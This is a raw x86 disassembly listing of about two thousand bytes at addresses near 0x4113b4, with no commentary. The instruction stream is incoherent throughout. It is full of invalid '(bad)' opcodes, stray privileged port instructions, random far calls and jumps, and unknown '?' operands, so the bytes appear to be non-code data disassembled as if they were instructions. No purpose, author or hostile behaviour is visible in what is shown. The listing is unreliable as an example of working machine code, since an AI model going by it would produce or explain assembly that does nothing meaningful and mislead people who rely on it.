  4113b4:	dec    esp
  4113b5:	ror    edx,cl
  4113b7:	outs   dx,DWORD PTR ds:[esi]
  4113b8:	fisttp DWORD PTR [ecx+0x31f177ca]
  4113be:	dec    edi
  4113bf:	inc    ecx
  4113c0:	je     0x41143d
  4113c2:	shl    DWORD PTR [edx+edx*1],1
  4113c5:	inc    eax
  4113c6:	(bad)  
  4113c7:	or     DWORD PTR [ebx],eax
  4113c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ca:	push   es
  4113cb:	add    esp,0x348751de
  4113d1:	adc    ah,BYTE PTR [edx-0x3701dce3]
  4113d7:	lea    bp,[edi-0x3f65d656]
  4113de:	fidivr DWORD PTR [esi+ebp*2]
  4113e1:	jmp    DWORD PTR [edi+0x11]
  4113e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e5:	shr    DWORD PTR [ecx+0x139f4925],1
  4113eb:	arpl   WORD PTR [ebx+0x158658c2],bp
  4113f1:	out    0x45,al
  4113f3:	and    eax,0x98a76a8b
  4113f8:	sbb    DWORD PTR [edx],ebp
  4113fa:	lock inc ebx
  4113fc:	cmp    DWORD PTR [ecx+0x6621c8c],ebp
  411402:	in     al,0x50
  411404:	pop    ebx
  411405:	push   fs
  411407:	popf   
  411408:	push   cs
  411409:	xor    bl,0x73
  41140c:	add    dh,BYTE PTR [ebx-0x58c57218]
  411412:	cmc    
  411413:	mov    al,ds:0xae4820f9
  411418:	pop    ds
  411419:	xlat   BYTE PTR ds:[ebx]
  41141a:	inc    edi
  41141b:	jae    0x4113d4
  41141d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41141e:	mov    ds:0x9cb5127e,al
  411423:	stc    
  411424:	scas   eax,DWORD PTR es:[edi]
  411425:	cld    
  411426:	jp     0x4113ae
  411428:	ret    0xa204
  41142b:	pusha  
  41142c:	sub    cl,BYTE PTR [edx-0x44ff268d]
  411432:	push   ebp
  411433:	and    eax,0x982f7963
  411438:	cmp    edx,DWORD PTR [ecx]
  41143a:	fs dec edi
  41143c:	jne    0x411405
  41143e:	xchg   edi,ebp
  411440:	cmp    ah,BYTE PTR ds:0x77f9db45
  411446:	sbb    eax,DWORD PTR [ebx-0x61fe0681]
  41144c:	adc    esi,DWORD PTR [ecx]
  41144e:	loopne 0x4114b8
  411450:	addr16 and dl,bh
  411453:	push   esp
  411454:	std    
  411455:	add    BYTE PTR [ebx],0x12
  411458:	sub    BYTE PTR [esi+esi*4],ah
  41145b:	dec    edi
  41145c:	push   0xffffff98
  41145e:	mov    bh,0x65
  411460:	adc    ebp,DWORD PTR [edx+0x5535b795]
  411466:	pop    edx
  411467:	(bad)  
  411468:	xor    dl,cl
  41146a:	pop    esp
  41146b:	nop
  41146c:	das    
  41146d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146e:	stos   BYTE PTR es:[edi],al
  41146f:	pop    ss
  411470:	sub    BYTE PTR [ecx],cl
  411472:	mov    al,ds:0xf68c64d
  411477:	repz mov ds:0xdec2549d,eax
  41147d:	leave  
  41147e:	mov    dh,0xf9
  411480:	sahf   
  411481:	adc    BYTE PTR [edx+0x6818cc4f],ah
  411487:	bound  edi,QWORD PTR [ebp+0x37]
  41148a:	or     BYTE PTR [ebp-0x3b],ah
  41148d:	mov    es,WORD PTR [esi+0x3afceecb]
  411493:	mov    dl,0x9f
  411495:	scas   eax,DWORD PTR es:[edi]
  411496:	xchg   ebp,eax
  411497:	fwait
  411498:	and    DWORD PTR [edx-0x6a],edx
  41149b:	jmp    0x2601d1c2
  4114a0:	cmc    
  4114a1:	dec    esi
  4114a2:	shr    ecx,1
  4114a4:	pop    DWORD PTR [ebx]
  4114a6:	int3   
  4114a7:	out    dx,al
  4114a8:	mov    ecx,0x47163f98
  4114ad:	mov    eax,0xb2b7e089
  4114b2:	xor    BYTE PTR [eax+eiz*2+0x1f0a135c],bl
  4114b9:	xor    eax,0xdab8896a
  4114be:	inc    ebx
  4114bf:	pop    ebx
  4114c0:	sbb    esi,ebx
  4114c2:	pop    edx
  4114c3:	mov    bl,0x2e
  4114c5:	inc    esi
  4114c6:	jo     0x41152b
  4114c8:	adc    al,0xdd
  4114ca:	dec    ebp
  4114cb:	xor    eax,0xd854011e
  4114d0:	add    al,0x91
  4114d2:	dec    ebx
  4114d3:	mov    dl,0x15
  4114d5:	scas   eax,DWORD PTR es:[edi]
  4114d6:	adc    BYTE PTR ds:0xfe232ed,0x16
  4114dd:	js     0x411463
  4114df:	retf   0x5136
  4114e2:	dec    ebx
  4114e3:	scas   al,BYTE PTR es:[edi]
  4114e4:	scas   al,BYTE PTR es:[edi]
  4114e5:	aaa    
  4114e6:	vmwrite edx,ebx
  4114e9:	int    0x24
  4114eb:	(bad)  
  4114ec:	or     DWORD PTR [ecx+0x1],ebp
  4114ef:	sub    eax,0xaec04bc6
  4114f4:	mov    cl,0x83
  4114f6:	pushf  
  4114f7:	adc    al,0x48
  4114f9:	mov    BYTE PTR [esi],0x4b
  4114fc:	cli    
  4114fd:	inc    edx
  4114fe:	mov    ds:0xa95a4d5b,eax
  411503:	into   
  411504:	sbb    DWORD PTR [ecx+ecx*2-0x11],edi
  411508:	das    
  411509:	jne    0x41149f
  41150b:	aam    0xd
  41150d:	mov    ebp,0x190dc17d
  411512:	lods   eax,DWORD PTR ds:[esi]
  411513:	pop    esp
  411514:	fcom   DWORD PTR [edx]
  411516:	add    eax,ebx
  411518:	aad    0x60
  41151a:	call   edx
  41151c:	jnp    0x41158d
  41151e:	stos   BYTE PTR es:[edi],al
  41151f:	jp     0x411584
  411521:	cmp    BYTE PTR [esi],al
  411523:	ds into 
  411525:	(bad)  
  411526:	push   es
  411527:	mov    BYTE PTR [ecx+0x69376441],ah
  41152d:	sub    BYTE PTR [ecx],dh
  41152f:	std    
  411530:	push   es
  411531:	mov    ah,0x4e
  411533:	mov    eax,0x77754fab
  411538:	push   ebp
  411539:	jnp    0x4114c6
  41153b:	jb     0x4115a2
  41153d:	nop
  41153e:	jnp    0x411598
  411540:	add    BYTE PTR [esi-0x2d],cl
  411543:	and    dh,BYTE PTR [ecx]
  411545:	loopne 0x411530
  411547:	mov    ?,ecx
  411549:	pop    ebx
  41154a:	xchg   esp,eax
  41154b:	stos   DWORD PTR es:[edi],eax
  41154c:	adc    eax,0xc1bfd4ff
  411551:	into   
  411552:	fst    DWORD PTR [edx]
  411554:	call   0xcf21:0xeae2f05a
  41155b:	pop    esp
  41155c:	(bad)  
  41155e:	(bad)  
  41155f:	jmp    0x201aec15
  411564:	pop    ebx
  411565:	scas   al,BYTE PTR es:[edi]
  411566:	mov    edi,0x1f8d5d7d
  41156b:	test   BYTE PTR [ebp+0x4d],bl
  41156e:	in     al,dx
  41156f:	retf   
  411570:	mov    eax,ds:0x2190fb8
  411575:	xchg   edx,eax
  411576:	pop    esp
  411577:	push   ecx
  411578:	daa    
  411579:	sub    BYTE PTR [eax],cl
  41157b:	mov    ds:0xf4862556,eax
  411580:	sub    eax,0x1433d930
  411585:	int    0x70
  411587:	or     al,0xae
  411589:	jecxz  0x4115dc
  41158b:	imul   ebx,DWORD PTR [edi-0x50],0xffffffc2
  41158f:	std    
  411590:	inc    esp
  411591:	push   cs
  411592:	(bad)  
  411593:	jmp    0x919d:0xae2ef1dc
  41159a:	add    ch,BYTE PTR gs:[edx+0x79319ea0]
  4115a1:	mov    DWORD PTR [ecx-0x29],esi
  4115a4:	test   al,0xa5
  4115a6:	aad    0x52
  4115a8:	jg     0x4115bd
  4115aa:	sub    DWORD PTR [ebx+eiz*8],edx
  4115ad:	dec    ecx
  4115ae:	retf   
  4115af:	cmc    
  4115b0:	in     al,dx
  4115b1:	fs jae 0x4115da
  4115b4:	pop    ds
  4115b5:	in     eax,0xc5
  4115b7:	(bad)
  4115ba:	dec    edx
  4115bb:	add    al,0x34
  4115bd:	ret    
  4115be:	ss pop eax
  4115c0:	push   0x71859a5b
  4115c5:	ins    DWORD PTR es:[edi],dx
  4115c6:	mov    ebp,0x5c039b95
  4115cb:	mov    al,0x56
  4115cd:	nop
  4115ce:	inc    edx
  4115cf:	ror    BYTE PTR [eax],cl
  4115d1:	shr    DWORD PTR [edi+0x73acff74],0x9d
  4115d8:	pushf  
  4115d9:	popf   
  4115da:	add    dl,BYTE PTR [esi-0x39]
  4115dd:	dec    ebp
  4115de:	iret   
  4115df:	imul   ebx,eax,0xffffffc7
  4115e2:	addr16 (bad) 
  4115e4:	in     eax,0x11
  4115e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e7:	call   0x2a7f5ee5
  4115ec:	rcr    BYTE PTR [ebx],0x6e
  4115ef:	jge    0x411665
  4115f1:	mov    ecx,0x2188ff03
  4115f6:	push   ss
  4115f7:	sub    al,0xb6
  4115f9:	in     eax,0xac
  4115fb:	xchg   edx,eax
  4115fc:	ret    0x7b6a
  4115ff:	or     bh,dh
  411601:	pop    edx
  411602:	jmp    0x411677
  411604:	gs jmp 0x41167f
  411607:	mov    BYTE PTR [ebx],dl
  411609:	push   ss
  41160a:	popf   
  41160b:	aad    0xc6
  41160d:	inc    edx
  41160e:	pushf  
  41160f:	clc    
  411610:	mov    ah,0x46
  411612:	(bad)  [esi]
  411614:	dec    eax
  411615:	xor    al,0xea
  411617:	mov    BYTE PTR [eax],cl
  411619:	xchg   esp,eax
  41161a:	jmp    0x4115b9
  41161c:	retf   
  41161d:	pop    esp
  41161e:	sbb    BYTE PTR [eax+0x78194f18],cl
  411624:	sub    ecx,ebp
  411626:	(bad)  
  411627:	and    al,0x1f
  411629:	mov    bl,0x6
  41162b:	adc    DWORD PTR [eax-0x30ff150e],ebx
  411631:	out    0xe5,al
  411633:	adc    DWORD PTR [ebp-0x63aeb347],ebp
  411639:	test   eax,0x2c20a4a1
  41163e:	add    esi,DWORD PTR [esp+eiz*8]
  411641:	ffreep st(7)
  411643:	iret   
  411644:	cmp    eax,0x8c11ff98
  411649:	push   ebx
  41164a:	sar    al,cl
  41164c:	pop    esi
  41164d:	sub    al,0x5f
  41164f:	gs retf 
  411651:	mov    ds:0xc3aae1c0,eax
  411656:	imul   edi,DWORD PTR [edi-0x46],0xffffffe7
  41165a:	cdq    
  41165b:	add    DWORD PTR [eax+ebp*2+0x18],ebp
  41165f:	sub    DWORD PTR [ebx+eax*8+0x2acf91a5],esi
  411666:	mov    ds:0x6303475b,eax
  41166b:	rol    esp,1
  41166d:	or     eax,0xa87e54b4
  411672:	pop    esi
  411673:	and    eax,0x1e0c67a0
  411678:	ins    BYTE PTR es:[edi],dx
  411679:	inc    esp
  41167a:	push   ds
  41167b:	lods   al,BYTE PTR ds:[esi]
  41167c:	nop
  41167d:	ins    DWORD PTR es:[edi],dx
  41167e:	push   edx
  41167f:	lods   al,BYTE PTR ds:[esi]
  411680:	mov    esi,DWORD PTR [edi]
  411682:	mov    bl,0xa2
  411684:	shl    DWORD PTR [eax-0x11],1
  411687:	jbe    0x41169c
  411689:	and    al,0x8d
  41168b:	fld    QWORD PTR [edi-0x4aaba4da]
  411691:	call   0xfb38:0x800493e6
  411698:	in     eax,0x41
  41169a:	cmc    
  41169b:	dec    ebp
  41169c:	dec    esi
  41169d:	pop    ds
  41169e:	cwde   
  41169f:	mov    edx,0xc4352a7f
  4116a4:	xchg   ecx,eax
  4116a5:	jmp    0x1683284a
  4116aa:	sbb    esi,eax
  4116ac:	in     eax,dx
  4116ad:	adc    dl,cl
  4116af:	daa    
  4116b0:	push   ds
  4116b1:	sbb    eax,0xdf19da9d
  4116b6:	xchg   BYTE PTR [esi+0xdfbefc],cl
  4116bc:	fld    DWORD PTR [eax-0x62a02ee4]
  4116c2:	sub    dh,BYTE PTR [edx+0x12]
  4116c5:	jge    0x4116b4
  4116c7:	dec    esi
  4116c8:	add    BYTE PTR [eax-0x19],ah
  4116cb:	ins    BYTE PTR es:[edi],dx
  4116cc:	aas    
  4116cd:	mov    ds:0x5e8b3b5e,al
  4116d2:	add    cl,BYTE PTR [ecx]
  4116d4:	imul   ebx,DWORD PTR [ecx],0xffffffed
  4116d7:	out    dx,al
  4116d8:	inc    esi
  4116d9:	call   0x614f:0xc1c6e3b2
  4116e0:	popf   
  4116e1:	dec    ebp
  4116e2:	xchg   ebp,eax
  4116e3:	add    al,0x9c
  4116e5:	shl    ebx,1
  4116e7:	and    esp,DWORD PTR [edx-0x74d1642c]
  4116ed:	pusha  
  4116ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ef:	xchg   edi,eax
  4116f0:	add    dh,ch
  4116f2:	and    eax,0x24ba3b0f
  4116f7:	xchg   esp,eax
  4116f8:	fmul   DWORD PTR [edi+ecx*2]
  4116fb:	sbb    al,0xc2
  4116fd:	jns    0x4116df
  4116ff:	xchg   esi,eax
  411700:	xor    ah,0x7
  411703:	jno    0x41171b
  411705:	ror    BYTE PTR ss:[ecx+ebx*4-0x24],cl
  41170a:	daa    
  41170b:	xor    BYTE PTR [edi-0x39],ch
  41170e:	or     BYTE PTR [eax],ch
  411710:	test   eax,0x5d66f20d
  411715:	out    0x7c,eax
  411717:	sar    ah,cl
  411719:	repnz or DWORD PTR [edx+ecx*4+0x73],0x0
  41171f:	repnz cmp cl,BYTE PTR [ebx+0x57a4260]
  411726:	or     dl,bl
  411728:	cli    
  411729:	jp     0x411736
  41172b:	pop    esp
  41172c:	std    
  41172d:	push   esp
  41172e:	popaw  
  411730:	mov    ebx,0x12ae99fe
  411735:	mov    ch,0x90
  411737:	ja     0x4116de
  411739:	ins    DWORD PTR es:[edi],dx
  41173a:	test   esp,esp
  41173c:	add    ebx,DWORD PTR [ebp+0x70]
  41173f:	stos   DWORD PTR es:[edi],eax
  411740:	stos   DWORD PTR es:[edi],eax
  411741:	ret    0x1d29
  411744:	ret    
  411745:	push   ebp
  411746:	fld    st(7)
  411748:	sbb    edi,edx
  41174a:	retf   0xc7e0
  41174d:	bound  ecx,QWORD PTR [edx]
  41174f:	(bad)  
  411750:	stc    
  411751:	js     0x41176a
  411753:	xchg   bh,cl
  411755:	pop    eax
  411756:	sub    BYTE PTR [eax-0x1f],ah
  411759:	adc    edx,ecx
  41175b:	mov    edi,0x6f897c7b
  411760:	mov    BYTE PTR [eax+0x13bfca24],bh
  411766:	(bad)  
  411767:	xchg   ebp,eax
  411768:	dec    si
  41176a:	mov    eax,0x64ebaa0d
  41176f:	or     ebp,DWORD PTR [edi+esi*1-0x46]
  411773:	jp     0x41177a
  411775:	xor    ah,0x8
  411778:	adc    al,0x10
  41177a:	cmp    eax,0xbf13d9c5
  41177f:	sbb    BYTE PTR [edi],bl
  411781:	sub    dl,BYTE PTR [eax+0x61]
  411784:	and    al,0x4
  411786:	or     DWORD PTR [ebp-0x7977110d],0x71ea6e0e
  411790:	add    ebx,DWORD PTR [ebx]
  411792:	sub    BYTE PTR [edx-0x3560a15a],bh
  411798:	sbb    BYTE PTR [ecx-0x17a86e51],dl
  41179e:	pop    edx
  41179f:	out    0x1e,al
  4117a1:	or     eax,0x8941f7a1
  4117a6:	out    dx,eax
  4117a7:	nop
  4117a8:	lahf   
  4117a9:	aaa    
  4117aa:	adc    eax,0xfcd80086
  4117af:	imul   eax,DWORD PTR [edx],0xffffff8d
  4117b2:	xor    ecx,DWORD PTR [ecx+0x6875c34b]
  4117b8:	push   ss
  4117b9:	add    DWORD PTR [ebx+0x44],eax
  4117bc:	ja     0x4117f1
  4117be:	rcr    DWORD PTR [eax-0x3d],1
  4117c1:	ds sub eax,0xb9f1a219
  4117c7:	ss cwde 
  4117c9:	and    ecx,DWORD PTR [esi+0x10cf541f]
  4117cf:	lock test al,0xd4
  4117d2:	dec    edx
  4117d3:	inc    esp
  4117d4:	jg     0x4117c3
  4117d6:	fld    DWORD PTR [eax-0x6e784f69]
  4117dc:	and    eax,0x1b28376d
  4117e1:	mov    ecx,0x506d5a0d
  4117e6:	cmp    ebp,DWORD PTR [edx+0x68]
  4117e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ea:	pop    ebp
  4117eb:	inc    esp
  4117ec:	cmc    
  4117ed:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4117ef:	fild   WORD PTR [esp+ecx*1-0x7ac9e052]
  4117f6:	repz push ebx
  4117f8:	sti    
  4117f9:	or     al,BYTE PTR [esi-0x605d453b]
  4117ff:	cmc    
  411800:	push   0xffffffe3
  411802:	add    esi,eax
  411804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411805:	ins    BYTE PTR es:[edi],dx
  411806:	shl    ch,1
  411808:	inc    edi
  411809:	loope  0x4117dc
  41180b:	scas   al,BYTE PTR es:[edi]
  41180c:	pop    ebp
  41180d:	mov    eax,ds:0x267c38cc
  411812:	inc    BYTE PTR [ecx+0x611be9ad]
  411818:	or     eax,0xbb84267b
  41181d:	fnstsw WORD PTR [edx+0x79]
  411820:	or     eax,edi
  411822:	push   ecx
  411823:	mov    dl,0xa8
  411825:	iret   
  411826:	jmp    FWORD PTR [eax-0x5a25692b]
  41182c:	adc    edx,DWORD PTR ds:0x9078e7b4
  411832:	aas    
  411833:	sbb    BYTE PTR [eax],dl
  411835:	inc    ecx
  411836:	int3   
  411837:	jp     0x411879
  411839:	jmp    0x78a6aa1f
  41183e:	pushf  
  41183f:	add    al,0x2b
  411841:	ins    DWORD PTR es:[edi],dx
  411842:	dec    esp
  411843:	mov    esi,DWORD PTR [ebp-0x54155b9a]
  411849:	dec    esp
  41184a:	int    0x1e
  41184c:	aad    0x59
  41184e:	push   cs
  41184f:	hlt    
  411850:	mov    cl,0x87
  411852:	mov    ds:0x96397640,eax
  411857:	shl    BYTE PTR [eax],1
  411859:	jmp    0x509ff2f4
  41185e:	sub    BYTE PTR [esi],bl
  411860:	cwde   
  411861:	xor    al,0x60
  411863:	mov    al,ds:0xc8d1cdc1
  411868:	mov    dh,0xdf
  41186a:	xchg   ecx,eax
  41186b:	rcr    DWORD PTR [esi-0x7679055a],1
  411871:	fldcw  WORD PTR [edi-0xc]
  411874:	mov    esp,ebp
  411876:	push   0xd21cb378
  41187b:	cmc    
  41187c:	fmul   DWORD PTR [ecx+0x266bde5c]
  411882:	jae    0x41187c
  411884:	pop    edx
  411885:	dec    ebx
  411886:	xlat   BYTE PTR ds:[ebx]
  411887:	inc    ebx
  411888:	loope  0x411829
  41188a:	cwde   
  41188b:	xchg   esp,eax
  41188c:	lods   al,BYTE PTR ds:[esi]
  41188d:	push   edi
  41188e:	adc    eax,0xd117f211
  411893:	bnd ret 
  411895:	xchg   ecx,ebp
  411897:	loop   0x4118f8
  411899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41189a:	rcr    DWORD PTR [esi+0x7268ed4c],0xaf
  4118a1:	mov    ebx,ds
  4118a3:	push   0x1f
  4118a5:	adc    edi,DWORD PTR [edi+0x3004992d]
  4118ab:	pop    esi
  4118ac:	mov    ebp,0x5c991777
  4118b1:	lods   eax,DWORD PTR ds:[esi]
  4118b2:	push   cs
  4118b3:	and    edx,ecx
  4118b5:	fwait
  4118b6:	cmc    
  4118b7:	shl    BYTE PTR [esi+0x607ea33b],1
  4118bd:	lea    eax,[eax+0x5]
  4118c0:	js     0x4118e0
  4118c2:	push   eax
  4118c3:	test   eax,0x3dcc7877
  4118c8:	or     eax,0xb0ba3f00
  4118cd:	cld    
  4118ce:	into   
  4118cf:	fchs   
  4118d1:	rcl    DWORD PTR [ecx-0x5c0b9f68],1
  4118d7:	out    0x13,eax
  4118d9:	add    dh,BYTE PTR [esi]
  4118db:	lock clc 
  4118dd:	jno    0x41192e
  4118df:	push   cs
  4118e0:	mov    WORD PTR ds:0x4b445b7a,ds
  4118e6:	shr    edx,1
  4118e8:	(bad)  
  4118e9:	pop    ebp
  4118ea:	mov    esp,0x32ef5005
  4118ef:	pop    ss
  4118f0:	xor    ah,al
  4118f2:	sbb    dl,al
  4118f4:	iret   
  4118f5:	sub    DWORD PTR [edi-0x1c38d990],ecx
  4118fb:	jmp    0x8d87b1aa
  411900:	iret   
  411901:	outs   dx,DWORD PTR ds:[esi]
  411902:	mov    dh,0x99
  411904:	mov    edx,0x2ae1d8e9
  411909:	jg     0x411944
  41190b:	or     DWORD PTR [esi-0x246ae5f8],edi
  411911:	retf   
  411912:	ret    
  411913:	inc    edi
  411914:	ret    
  411915:	repnz lea edx,[ebp-0x36157f43]
  41191c:	loopne 0x411940
  41191e:	mov    edx,0x22fc4b0f
  411923:	in     eax,0x7a
  411925:	hlt    
  411926:	jnp    0x411947
  411928:	imul   edi,DWORD PTR [ecx+0x6b],0x2eb4b20
  41192f:	push   ss
  411930:	mov    al,ds:0x15dd56fa
  411935:	imul   ebp,DWORD PTR [eax+eax*4],0x28
  411939:	add    ch,BYTE PTR [ebp-0x2b7ec338]
  41193f:	je     0x41193d
  411941:	pop    ds
  411942:	mov    al,ds:0x889750ef
  411947:	into   
  411948:	icebp  
  411949:	xlat   BYTE PTR ds:[ebx]
  41194a:	scas   al,BYTE PTR es:[edi]
  41194b:	dec    ecx
  41194c:	div    DWORD PTR [eax]
  41194e:	retf   
  41194f:	xchg   esp,eax
  411950:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411952:	sub    cl,BYTE PTR [edx-0x1a1e118a]
  411958:	call   0xda9e:0x7704d51c
  41195f:	outs   dx,DWORD PTR ds:[esi]
  411960:	xor    edi,DWORD PTR [eax+0x4d3d4e66]
  411966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411967:	sbb    DWORD PTR [edx+0x1],eax
  41196a:	or     bh,dl
  41196c:	mov    esp,DWORD PTR [edi]
  41196e:	adc    al,0x78
  411970:	xor    al,BYTE PTR [esi+edx*1+0x70]
  411974:	test   al,0xeb
  411976:	fsubr  DWORD PTR [esi*4-0x6a8e58e0]
  41197d:	fsub   QWORD PTR [ecx]
  41197f:	xchg   esp,eax
  411980:	sbb    ebx,eax
  411982:	xchg   edi,eax
  411983:	(bad)  
  411984:	push   ss
  411985:	or     al,0x83
  411987:	jb     0x411978
  411989:	and    DWORD PTR [edi],ebp
  41198b:	mov    ecx,ebp
  41198d:	push   edx
  41198e:	(bad)  
  41198f:	aam    0xa6
  411991:	mov    ds:0x7a693cdb,al
  411996:	jecxz  0x41193a
  411998:	int    0xb8
  41199a:	inc    edi
  41199b:	aas    
  41199c:	mov    cl,0xd0
  41199e:	leave  
  41199f:	jnp    0x411a0c
  4119a1:	hlt    
  4119a2:	adc    cl,BYTE PTR [edi]
  4119a4:	out    dx,eax
  4119a5:	repnz stos DWORD PTR es:[edi],eax
  4119a7:	mov    bl,0x85
  4119a9:	imul   edi,DWORD PTR [esi-0x223ba44c],0x6ef39e27
  4119b3:	pop    eax
  4119b4:	sahf   
  4119b5:	ficom  WORD PTR [ebp+0x6c]
  4119b8:	mov    cl,bh
  4119ba:	leave  
  4119bb:	pushf  
  4119bc:	mov    ebp,0xccdc1d18
  4119c1:	add    esi,DWORD PTR [eax+0x74]
  4119c4:	sub    ecx,edi
  4119c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c7:	into   
  4119c8:	jb     0x411a39
  4119ca:	jb     0x411972
  4119cc:	addr16 adc eax,0xba3ca0ae
  4119d2:	mov    ebp,DWORD PTR [esi-0x33]
  4119d5:	stc    
  4119d6:	or     al,0x21
  4119d8:	shl    BYTE PTR [ecx-0x23203cad],cl
  4119de:	inc    edx
  4119df:	repnz pushf 
  4119e1:	xor    dh,BYTE PTR [esi+0x60a9b5bd]
  4119e7:	xor    DWORD PTR [ecx+0x67],ecx
  4119ea:	cmp    eax,DWORD PTR [ebx-0x6b]
  4119ed:	ja     0x411987
  4119ef:	xor    BYTE PTR [esi+0x5ec60c5a],ch
  4119f5:	outs   dx,DWORD PTR ds:[esi]
  4119f6:	cmp    al,0xa3
  4119f8:	lods   al,BYTE PTR ds:[esi]
  4119f9:	fsub   QWORD PTR [esi+0x3baa6710]
  4119ff:	loopne 0x411a38
  411a01:	sti    
  411a02:	and    al,0x6e
  411a04:	adc    eax,0xa346b61b
  411a09:	sbb    bl,BYTE PTR [ebx]
  411a0b:	sbb    eax,eax
  411a0d:	sbb    WORD PTR [edi-0x4d49c8a5],sp
  411a14:	cmp    al,0xd7
  411a16:	xlat   BYTE PTR ds:[ebx]
  411a17:	bound  bp,DWORD PTR gs:[edi]
  411a1b:	pop    ecx
  411a1c:	adc    al,0x5f
  411a1e:	and    ebp,DWORD PTR [eiz*4+0x59521bcc]
  411a25:	cdq    
  411a26:	dec    ecx
  411a27:	ja     0x411a90
  411a29:	push   ds
  411a2a:	js     0x4119dc
  411a2c:	popf   
  411a2d:	and    eax,DWORD PTR [edi+ecx*2]
  411a30:	stos   BYTE PTR es:[edi],al
  411a31:	popa   
  411a32:	mov    al,ds:0xdf51f098
  411a37:	mov    ds:0x3986dfff,eax
  411a3c:	repnz rcl edi,0x5
  411a40:	test   eax,0xfed3434b
  411a45:	pop    edx
  411a46:	adc    al,0x6d
  411a48:	leave  
  411a49:	inc    eax
  411a4a:	dec    eax
  411a4b:	lahf   
  411a4c:	mov    eax,ds:0x191bafb6
  411a51:	mov    ss,WORD PTR [edi]
  411a53:	cs daa 
  411a55:	or     al,0x72
  411a57:	cdq    
  411a58:	cmc    
  411a59:	pop    ss
  411a5a:	rol    eax,cl
  411a5c:	xchg   ecx,eax
  411a5d:	push   ss
  411a5e:	xchg   BYTE PTR [edx+0x77f4b04c],dl
  411a64:	mov    edx,0xd9227d4f
  411a69:	push   eax
  411a6a:	push   ss
  411a6b:	fwait
  411a6c:	(bad)  
  411a6d:	(bad)  
  411a6f:	and    DWORD PTR [esi+0x74],esi
  411a72:	adc    cl,BYTE PTR [ebp-0x16]
  411a75:	push   0x5f6c6ec3
  411a7a:	fdivr  st(6),st
  411a7c:	push   edx
  411a7d:	(bad)  
  411a7e:	mov    ah,0x8c
  411a80:	sbb    dl,BYTE PTR [ecx+eax*4-0x1a]
  411a84:	mov    ds:0x535e335d,eax
  411a89:	scas   al,BYTE PTR es:[edi]
  411a8a:	ins    DWORD PTR es:[di],dx
  411a8c:	jmp    0xa5d0:0x68790988
  411a93:	sbb    ebx,esp
  411a95:	lods   al,BYTE PTR ds:[esi]
  411a96:	push   ebp
  411a97:	adc    cl,cl
  411a99:	sub    eax,0x3e5ed11
  411a9e:	and    esi,eax
  411aa0:	xor    dl,dl
  411aa2:	xchg   ebx,eax
  411aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa4:	(bad)  
  411aa5:	fsubr  QWORD PTR [edi-0x1d]
  411aa8:	ins    DWORD PTR es:[edi],dx
  411aa9:	pop    ebp
  411aaa:	jmp    0x411a95
  411aac:	div    DWORD PTR [ebx+edx*8+0x29]
  411ab0:	or     edi,ecx
  411ab2:	sub    ecx,ebp
  411ab4:	inc    edi
  411ab5:	mov    ds:0x8f557307,eax
  411aba:	scas   al,BYTE PTR es:[edi]
  411abb:	xlat   BYTE PTR ds:[ebx]
  411abc:	sub    edi,DWORD PTR [eax+ecx*4+0x7e]
  411ac0:	mov    edi,0xeea9e462
  411ac5:	cli    
  411ac6:	add    DWORD PTR [eax+ecx*8+0x67],eax
  411aca:	je     0x411ac8
  411acc:	outs   dx,BYTE PTR ds:[esi]
  411acd:	mov    cl,0xe
  411acf:	dec    ebp
  411ad0:	or     cl,BYTE PTR [ebx]
  411ad2:	adc    eax,0x1c65db82
  411ad7:	mov    ecx,0xde9047ec
  411adc:	fld    st(2)
  411ade:	ss imul ecx,esi,0x29b5b122
  411ae5:	in     eax,dx
  411ae6:	stos   BYTE PTR es:[edi],al
  411ae7:	aaa    
  411ae8:	ja     0x411b06
  411aea:	or     edi,DWORD PTR [esi+0x5]
  411aed:	fbld   TBYTE PTR [ecx-0x5cd7d63]
  411af3:	enter  0xe726,0x5d
  411af7:	loop   0x411ad5
  411af9:	in     eax,0x17
  411afb:	test   al,0xa1
  411afd:	sub    eax,0x85dc6614
  411b02:	call   esp
  411b04:	ret    
  411b05:	mov    ebp,0x87c11908
  411b0a:	retf   0x2c28
  411b0d:	daa    
  411b0e:	fs inc eax
  411b10:	mov    dl,0x32
  411b12:	jbe    0x411ac8
  411b14:	ss pop ecx
  411b16:	dec    edx
  411b17:	clc    
  411b18:	aas    
  411b19:	lahf   
  411b1a:	xlat   BYTE PTR ds:[ebx]
  411b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b1c:	inc    edi
  411b1d:	mov    bh,0xa2
  411b1f:	lods   eax,DWORD PTR ds:[esi]
  411b20:	mov    DWORD PTR [edx],0xeb177719
  411b26:	mov    WORD PTR [esp+eax*8],?
  411b29:	es (bad) 
  411b2b:	cwde   
  411b2c:	and    DWORD PTR [eax],ecx
  411b2e:	sti    
  411b2f:	add    eax,0xeea0322b
  411b34:	sub    BYTE PTR [esi],dh
  411b36:	call   0xe79a01f9
  411b3b:	sbb    bh,BYTE PTR [ebx-0x67b9593d]
  411b41:	or     BYTE PTR [eax-0x368f513a],ch
  411b47:	sbb    al,0xb4
  411b49:	fs retf 0x8abf
  411b4d:	jae    0x411acf
  411b4f:	or     esp,DWORD PTR [ecx]
  411b51:	in     eax,0x4a
  411b53:	sahf   
  411b54:	(bad)  
  411b55:	in     al,0xfe
  411b57:	adc    al,0x98
  411b59:	jge    0x411b49
  411b5b:	fstp   TBYTE PTR [ebp+0x35b006e1]
  411b61:	call   FWORD PTR [edx+0x788031ed]
  411b67:	inc    ebp
  411b68:	mov    WORD PTR [edi-0x3c],?
  411b6b:	call   0xc653:0xfd713504
  411b72:	adc    al,0x96
  411b74:	out    0xa7,al
  411b76:	pop    es
